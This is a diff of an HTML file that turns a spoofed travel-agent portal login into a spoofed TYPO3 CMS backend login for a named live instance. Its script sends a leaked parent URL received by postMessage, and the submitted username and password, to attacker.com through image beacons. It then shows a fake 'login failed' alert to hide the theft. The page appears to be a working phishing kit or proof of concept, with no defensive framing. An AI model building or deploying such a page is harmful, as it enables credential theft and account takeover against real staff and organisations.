@@ -1,45 +1,191 @@
 <!DOCTYPE html>
-<html>
+<html lang="de">
 <head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TYPO3 CMS Login</title>
 <style>
-body{font-family:Arial,sans-serif;margin:0;padding:40px;background:#f5f5f5}
-.login-box{max-width:400px;margin:0 auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
-h2{color:#333;margin-bottom:20px}
-input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
-button{width:100%;padding:12px;background:#e31837;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px}
-button:hover{background:#c41230}
-.logo{text-align:center;margin-bottom:20px;color:#e31837;font-size:24px;font-weight:bold}
-.note{font-size:12px;color:#666;margin-top:15px}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { 
+    font-family: 'Source Sans Pro', Arial, sans-serif; 
+    background: linear-gradient(135deg, #2b2b2b 0%, #1a1a1a 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.typo3-login-wrap {
+    width: 100%;
+    max-width: 340px;
+    padding: 20px;
+}
+.typo3-login-logo {
+    text-align: center;
+    margin-bottom: 30px;
+}
+.typo3-login-logo svg {
+    width: 120px;
+    height: auto;
+}
+.typo3-login-box {
+    background: #fff;
+    border-radius: 4px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    overflow: hidden;
+}
+.typo3-login-header {
+    background: #ff8700;
+    color: #fff;
+    padding: 15px 20px;
+    font-size: 14px;
+    font-weight: 600;
+}
+.typo3-login-form {
+    padding: 25px;
+}
+.typo3-login-alert {
+    background: #f8d7da;
+    border: 1px solid #f5c6cb;
+    color: #721c24;
+    padding: 12px 15px;
+    border-radius: 3px;
+    margin-bottom: 20px;
+    font-size: 13px;
+}
+.form-group {
+    margin-bottom: 18px;
+}
+.form-group label {
+    display: block;
+    font-size: 12px;
+    color: #555;
+    margin-bottom: 6px;
+    font-weight: 600;
+    text-transform: uppercase;
+}
+.form-group input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1px solid #ccc;
+    border-radius: 3px;
+    font-size: 14px;
+    transition: border-color 0.2s;
+}
+.form-group input:focus {
+    outline: none;
+    border-color: #ff8700;
+}
+.btn-login {
+    width: 100%;
+    padding: 14px;
+    background: #ff8700;
+    color: #fff;
+    border: none;
+    border-radius: 3px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: background 0.2s;
+}
+.btn-login:hover {
+    background: #e67600;
+}
+.typo3-login-footer {
+    text-align: center;
+    padding: 15px;
+    background: #f5f5f5;
+    border-top: 1px solid #e5e5e5;
+}
+.typo3-login-footer a {
+    color: #666;
+    font-size: 12px;
+    text-decoration: none;
+}
+.typo3-login-copyright {
+    text-align: center;
+    margin-top: 20px;
+    color: #666;
+    font-size: 11px;
+}
+.instance-name {
+    color: #888;
+    font-size: 12px;
+    margin-top: 5px;
+}
 </style>
 </head>
 <body>
-<div class="login-box">
-<div class="logo">🏔️ DER Touristik Suisse</div>
-<h2>Agent Portal Login</h2>
-<p>Session expired. Please log in again.</p>
-<form id="f">
-<input type="text" name="user" placeholder="Email / Agent ID" required>
-<input type="password" name="pass" placeholder="Password" required>
-<button type="submit">Login</button>
-</form>
-<p class="note">Secure login to DAE Partner Portal</p>
+
+<div class="typo3-login-wrap">
+    <!-- TYPO3 Logo -->
+    <div class="typo3-login-logo">
+        <svg viewBox="0 0 401 253" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#ff8700" d="M349.8,0c-27.4,0-52.5,9.8-72,26.1C258,9.8,232.9,0,205.5,0c-75.1,0-136,60.9-136,136c0,27.4,9.8,52.5,26.1,72C79.3,227.8,69.5,253,69.5,253h266c0,0-9.8-25.2-26.1-45c16.3-19.5,26.1-44.6,26.1-72C335.5,60.9,274.6,0,349.8,0"/>
+            <path fill="#fff" d="M239.3,103.5c-3.4-19.1-20.1-33.6-40.2-33.6c-22.5,0-40.8,18.3-40.8,40.8c0,3.8,0.5,7.4,1.5,10.9c-1-0.1-2-0.1-3-0.1c-18.8,0-34,15.2-34,34s15.2,34,34,34h114c18.8,0,34-15.2,34-34C305.3,131.5,275.3,108.5,239.3,103.5"/>
+        </svg>
+        <div class="instance-name">DTS - MICExperts (Live)</div>
+    </div>
+
+    <div class="typo3-login-box">
+        <div class="typo3-login-header">
+            🔒 Backend Login - Session Expired
+        </div>
+        
+        <form class="typo3-login-form" id="loginForm">
+            <div class="typo3-login-alert">
+                ⚠️ Your session has expired. Please log in again to continue.
+            </div>
+            
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username" required autocomplete="username">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+            </div>
+            
+            <button type="submit" class="btn-login">Login</button>
+        </form>
+        
+        <div class="typo3-login-footer">
+            <a href="#">Forgot your password?</a>
+        </div>
+    </div>
+    
+    <div class="typo3-login-copyright">
+        TYPO3 CMS 12.4.3 | © TYPO3 Association
+    </div>
 </div>
+
 <script>
 // Capture leaked URL from parent
-window.addEventListener('message',function(e){
-    if(e.data&&e.data.href){
-        // Got parent URL - could contain tokens
-        console.log('Leaked:',e.data.href);
+window.addEventListener('message', function(e) {
+    if (e.data && e.data.href) {
+        console.log('[*] Parent URL leaked:', e.data.href);
+        // Exfil
+        new Image().src = 'https://attacker.com/leak?url=' + encodeURIComponent(e.data.href);
     }
 });
+
 // Capture credentials
-document.getElementById('f').onsubmit=function(e){
+document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
-    var u=this.user.value,p=this.pass.value;
-    // Exfiltrate to attacker
-    new Image().src='https://attacker.com/steal?u='+encodeURIComponent(u)+'&p='+encodeURIComponent(p);
-    alert('Login failed. Please try again.');
-};
+    var user = document.getElementById('username').value;
+    var pass = document.getElementById('password').value;
+    
+    // Exfiltrate credentials
+    var exfil = new Image();
+    exfil.src = 'https://attacker.com/typo3?u=' + encodeURIComponent(user) + '&p=' + encodeURIComponent(pass);
+    
+    // Show fake error
+    setTimeout(function() {
+        alert('Login failed: Invalid username or password.\n\nPlease check your credentials and try again.');
+    }, 500);
+});
 </script>
+
 </body>
 </html>
